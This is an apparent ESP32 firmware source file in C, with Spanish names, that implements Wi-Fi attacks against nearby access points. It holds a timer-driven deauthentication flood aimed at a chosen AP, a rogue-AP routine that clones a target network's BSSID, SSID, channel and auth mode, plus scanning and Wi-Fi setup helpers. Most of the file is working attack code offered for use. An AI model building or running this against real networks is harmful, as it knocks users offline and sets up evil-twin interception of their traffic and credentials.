#include "wifi_controller.h"
#include "icons.h"
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include "ataques_wifi.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "globals.h"
#include "nvs_flash.h"
#include "wsl_bypasser.h"
#include "esp_timer.h"

static esp_timer_handle_t deauth_timer_handle;

static const char *TAG = "main:attack_dos";
static bool guaifai_iniciado = false;

void attack_dos_start(wifi_ap_record_t ap_record) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
    attack_method_broadcast(&ap_record, 0);
}

void attack_dos_stop() {
	attack_method_broadcast_stop();
    ESP_LOGI(TAG, "DoS attack stopped");
}

void basta_guaifai() {
	if (!guaifai_iniciado) return;
	guaifai_iniciado = false;
	esp_wifi_stop();
	esp_wifi_deinit();
	ESP_ERROR_CHECK(esp_event_loop_delete_default());	
}

int iniciar_guaifai(const char *TAG) {
	if (guaifai_iniciado) return 0;
	guaifai_iniciado = true;
	int rval = -1;
	esp_err_t ret;
	ESP_ERROR_CHECK(esp_event_loop_create_default());
	// Inicializar NVS
    ESP_LOGI(TAG, "Inicializando NVS...");
    ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error inicializando NVS: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Init NVS!", true);
        goto error;
    }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
	ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error inicializando Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Init Wi-Fi!", true);
        goto error;
    }
    ret = esp_wifi_set_mode(WIFI_MODE_STA);
    if (ret != ESP_OK) {
		ESP_LOGE(TAG, "Error fijando el modo Wi-Fi: %s", esp_err_to_name(ret));
		mostrar_mensaje("Error Modo Wi-Fi", true);
		goto error;
	}
    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error iniciando Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Start Wi-Fi!", true);
        goto error;
    }
    rval = 0;
    return rval;
error:
	basta_guaifai();
	return rval;
}

bool esta_guaifai() {
	return guaifai_iniciado;
}

static void timer_send_deauth_frame(void *arg){
    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
    printf("Paquete enviado!");
}

void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}

void attack_method_broadcast_stop(){
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
}

void attack_method_rogueap(const wifi_ap_record_t *ap_record){
	static const char *TAG = "main:attack_method";
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}

const wifictl_ap_records_t *get_aps() {
	const wifictl_ap_records_t *aps; 
	static const char *TAG = "WIFI_SCAN";
	if (iniciar_guaifai(TAG) == -1) {
		return NULL;
	}
	// vTaskDelay(5000 / portTICK_PERIOD_MS);
	wifictl_scan_nearby_aps();
	aps = wifictl_get_ap_records();
	return aps;
}

const char *rssi_to_icon(int8_t rssi) {
	if (rssi >=  -70) return &wifi_bitmap_4;
	if (rssi >=  -85) return &wifi_bitmap_3;
	if (rssi >= -100) return &wifi_bitmap_2;
	if (rssi >= -128) return &wifi_bitmap_1;
	return &wifi_bitmap_0;
}